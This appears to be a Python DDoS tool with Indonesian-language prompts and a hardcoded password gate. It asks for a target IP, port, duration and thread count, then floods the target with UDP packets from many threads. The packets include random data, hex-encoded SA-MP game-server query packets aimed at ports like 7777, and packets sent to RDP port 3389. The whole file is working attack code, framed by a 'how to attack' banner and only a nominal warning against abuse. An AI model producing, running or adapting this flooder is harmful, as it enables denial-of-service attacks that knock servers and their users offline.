import socket, struct, codecs, sys, threading, random, time, os, argparse



proxys = open('proxies.txt').readlines()

bots = len(proxys)




pasw = "Pablo"

for i in range(1):
    pwd = input(" Password : ")
    j = 3
    if (pwd == pasw):
        time.sleep(.2)
        print("[✓] Logging")
        time.sleep(.2)
        break
    else:
        time.sleep(.4)
        print("[x] AWOKAWOK SALAH \n")
        continue
time.sleep(.5)
print("\033[1;35mSuccesfull Logins To Server")
time.sleep(.6)

os.system("clear")
print("\u001b[1;35mWELCOME TO TOOLS DDOS")
print("\u001b[1;35m[!] PERINGATAN JANGAN MENGGUNAKAN TOOLS INI SEBAGAI ABUSE DDOS")

print(" ╔══════════════════════════════════╗")
print(" ║ Example How To Attack!           ║")
print(" ║ 1. Masukan Host/IP               ║")
print(" ║ 2. Masukan Port 80/3389/7777/433!║")
print(" ║ 3. Masukan Waktu                 ║")
print(" ║ 4. Masukan Theards               ║")
print(" ║ 5. Choice Serang Port 3389 (y/n) ║")
print(" ╚══════════════════════════════════╝")
print("\033[1;31m")
ip = str(input(" [+] Enter IP : "))

port = int(input(" [+] Enter Port : "))

times = int(input(" [+] Time : "))

threads = int(input(" [+] Threads : "))

choice = str(input(" [+] With attack rdp 3389 (y/n) : "))




# // Convert domain to ip.

host = socket.gethostbyname(ip)



os.system('cls' if os.name == 'nt' else 'clear')

print (f'''

MENG GREPE GREPE IP : {host} DAN MEN SODOK PORT : {port} DENGAN WAKTU : {times}

''')

               
# // SampPackets ( UDP )

def sampdos(host, port, times):

        Attack = [

        codecs.decode('53414d5090d91d4d611e700a465b00', 'hex_codec'),

        codecs.decode('53414d509538e1a9611e63', 'hex_codec'),

        codecs.decode('53414d509538e1a9611e69', 'hex_codec'),

        codecs.decode('53414d509538e1a9611e72', 'hex_codec'),

        codecs.decode('081e62da', 'hex_codec'),

        codecs.decode('081e77da', 'hex_codec'),

        codecs.decode('081e4dda', 'hex_codec'),

        codecs.decode('021efd40', 'hex_codec'),

        codecs.decode('081e7eda', 'hex_codec')]

        timeout = time.time() + float(times)

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        while time.time() < timeout:

                packets = random._urandom(1021)

                packet = random._urandom(1490)

                pack = random._urandom(666)

                msg = Attack[random.randrange(0,3)]

                sock.sendto(pack, (host, int(port)))

                sock.sendto(packet, (host, int(port)))

                sock.sendto(msg, (host, int(port)))

                sock.sendto(packets, (host, int(port)))

                if int(port) == 7777:

                        sock.sendto(Attack[5], (host, int(port)))

                elif int(port) == 7796:

                        sock.sendto(Attack[4], (host, int(port)))

                elif int(port) == 7771:

                        sock.sendto(Attack[6], (host, int(port)))

                elif int(port) == 7784:

                        sock.sendto(Attack[7], (host, int(port)))



def randsender(host, port, times):

        timeout = time.time() + float(times)

        sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

        punch = random._urandom(int(1024))

        while time.time() < timeout:

                sock.sendto(punch, (host, int(port)))

                sock.sendto(punch, (host, int(port)))

                sock.sendto(punch, (host, int(port)))





def stdsender(host, times):

        timeout = time.time() + float(times)

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        payload = b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00'

        port = '3389'

        while time.time() < timeout:

                sock.sendto(payload, (host, int(port)))

                sock.sendto(payload, (host, int(port)))

                sock.sendto(payload, (host, int(port)))





for y in range(threads):

        if choice == 'y':

                threading.Thread(target=sampdos, args=(host, port, times)).start()

                threading.Thread(target=randsender, args=(host, port, times)).start()

                threading.Thread(target=stdsender, args=(host, times)).start()

        else:

                threading.Thread(target=sampdos, args=(host, port, times)).start()

                threading.Thread(target=randsender, args=(host, port, times)).start()